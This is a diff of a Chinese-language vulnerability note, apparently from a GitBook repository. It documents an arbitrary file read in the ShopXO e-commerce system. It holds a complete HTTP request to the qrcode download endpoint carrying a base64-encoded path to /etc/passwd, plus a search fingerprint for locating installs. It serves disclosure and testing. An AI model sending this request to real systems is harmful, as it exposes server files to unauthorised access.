@@ -20,11 +20,11 @@ app="ShopXO企业级B2C电商系统提供商"
 
 商城主页如下
 
-![](images/202202170858707.png)
+![](../.gitbook/assets/202202170858707.png)
 
 发送漏洞请求包
 
-```plain
+```
 GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
@@ -37,4 +37,4 @@ Upgrade-Insecure-Requests: 1
 
 其中 **/url/xxxx** 中的 base64 解码后为 **/etc/passwd**
 
-![](images/202202170859076.png)
+![](../.gitbook/assets/202202170859076.png)
